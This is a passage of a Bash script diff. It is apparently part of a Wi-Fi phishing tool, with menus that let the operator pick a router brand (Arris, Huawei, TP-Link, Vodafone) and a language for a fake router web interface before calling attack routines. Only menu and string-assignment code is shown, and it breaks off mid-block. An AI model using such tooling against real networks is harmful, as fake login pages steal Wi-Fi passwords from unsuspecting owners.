+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_ARRIS_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_ARRIS_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_ARRIS_ENG5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_ARRIS_ENG6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_ARRIS_ENG7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_ARRIS_ENG8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_ARRIS_ENG9
+				ARRIS 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_ARRIS_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_ARRIS_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_ARRIS_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_ARRIS_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_ARRIS_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_ARRIS_ESP6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_ARRIS_ESP7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_ARRIS_ESP8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_ARRIS_ESP9
+				ARRIS
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_ARRIS_IT1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_ARRIS_IT2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_ARRIS_IT3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_ARRIS_IT4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_ARRIS_IT5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_ARRIS_IT6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_ARRIS_IT7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_ARRIS_IT8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_ARRIS_IT9
+				ARRIS
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_ARRIS_FR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_ARRIS_FR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_ARRIS_FR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_ARRIS_FR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_ARRIS_FR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_ARRIS_FR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_ARRIS_FR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_ARRIS_FR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_ARRIS_FR9
+				ARRIS
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_ARRIS_POR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_ARRIS_POR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_ARRIS_POR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_ARRIS_POR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_ARRIS_POR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_ARRIS_POR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_ARRIS_POR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_ARRIS_POR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_ARRIS_POR9
+				ARRIS
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+function HUAWEI1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface HUAWEI"
+		echo -e "$verde""2)"$rescolor" $Back_to_menu"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" $Back_to_menu"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_HUAWEI_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_HUAWEI_ENG2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_HUAWEI_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_HUAWEI_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_HUAWEI_ENG5
+				HUAWEI 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_HUAWEI_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_HUAWEI_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_HUAWEI_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_HUAWEI_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_HUAWEI_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_HUAWEI_ESP6
+				HUAWEI
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_HUAWEI_IT1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_HUAWEI_IT2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_HUAWEI_IT3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_HUAWEI_IT4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_HUAWEI_IT5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_HUAWEI_IT6
+				HUAWEI
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_HUAWEI_FR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_HUAWEI_FR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_HUAWEI_FR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_HUAWEI_FR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_HUAWEI_FR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_HUAWEI_FR6
+				HUAWEI
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_HUAWEI_POR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_HUAWEI_POR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_HUAWEI_POR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_HUAWEI_POR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_HUAWEI_POR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_HUAWEI_POR6
+				HUAWEI
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+function TPLINK1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface TP-LINK"
+		echo -e "$verde""2)"$rescolor" $Back_to_menu"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" $Back_to_menu"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_TPLINK_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_TPLINK_ENG2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_TPLINK_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_TPLINK_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_TPLINK_ENG5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_TPLINK_ENG6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_TPLINK_ENG7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_TPLINK_ENG8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_TPLINK_ENG9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_TPLINK_ENG10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_TPLINK_ENG11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_TPLINK_ENG12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_TPLINK_ENG13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_TPLINK_ENG14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_TPLINK_ENG15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_TPLINK_ENG16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_TPLINK_ENG17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_TPLINK_ENG18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_TPLINK_ENG19
+				TPLINK 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_TPLINK_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_TPLINK_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_TPLINK_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_TPLINK_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_TPLINK_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_TPLINK_ESP6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_TPLINK_ESP7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_TPLINK_ESP8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_TPLINK_ESP9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_TPLINK_ESP10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_TPLINK_ESP11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_TPLINK_ESP12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_TPLINK_ESP13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_TPLINK_ESP14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_TPLINK_ESP15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_TPLINK_ESP16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_TPLINK_ESP17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_TPLINK_ESP18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_TPLINK_ESP19
+				
+				TPLINK
+				break
+			
+			elif [ "$linea" = "3" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+
+function VODAFONE1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface VODAFONE"
+		echo -e "$verde""2)"$rescolor" \e[1;31mBack"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" \e[1;31mBack"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VODAFONE_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VODAFONE_ENG2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VODAFONE_ENG3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VODAFONE_ENG4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VODAFONE_ENG5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VODAFONE_ENG6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VODAFONE_ENG7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VODAFONE_ENG8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VODAFONE_ENG9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VODAFONE_ENG10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VODAFONE_ENG11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VODAFONE_ENG12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VODAFONE_ENG13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VODAFONE_ENG14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VODAFONE_ENG15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VODAFONE_ENG16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VODAFONE_ENG17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_VODAFONE_ENG18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_VODAFONE_ENG19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_VODAFONE_ENG20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_VODAFONE_ENG21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_VODAFONE_ENG22
+				VODAFONE 
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VODAFONE_ESP1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VODAFONE_ESP2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VODAFONE_ESP3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VODAFONE_ESP4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VODAFONE_ESP5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VODAFONE_ESP6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VODAFONE_ESP7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VODAFONE_ESP8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VODAFONE_ESP9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VODAFONE_ESP10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VODAFONE_ESP11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VODAFONE_ESP12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VODAFONE_ESP13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VODAFONE_ESP14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VODAFONE_ESP15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VODAFONE_ESP16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VODAFONE_ESP17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_VODAFONE_ESP18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_VODAFONE_ESP19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_VODAFONE_ESP20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_VODAFONE_ESP21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_VODAFONE_ESP22
+				VODAFONE
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VODAFONE_IT1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VODAFONE_IT2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VODAFONE_IT3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VODAFONE_IT4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VODAFONE_IT5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VODAFONE_IT6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VODAFONE_IT7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VODAFONE_IT8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VODAFONE_IT9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VODAFONE_IT10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VODAFONE_IT11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VODAFONE_IT12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VODAFONE_IT13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VODAFONE_IT14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VODAFONE_IT15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VODAFONE_IT16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VODAFONE_IT17
+				DIALOG_WEB_INDEX_18=$DIALOG_WEB_INDEX_VODAFONE_IT18
+				DIALOG_WEB_INDEX_19=$DIALOG_WEB_INDEX_VODAFONE_IT19
+				DIALOG_WEB_INDEX_20=$DIALOG_WEB_INDEX_VODAFONE_IT20
+				DIALOG_WEB_INDEX_21=$DIALOG_WEB_INDEX_VODAFONE_IT21
+				DIALOG_WEB_INDEX_22=$DIALOG_WEB_INDEX_VODAFONE_IT22
+				VODAFONE
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VODAFONE_FR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VODAFONE_FR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VODAFONE_FR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VODAFONE_FR4
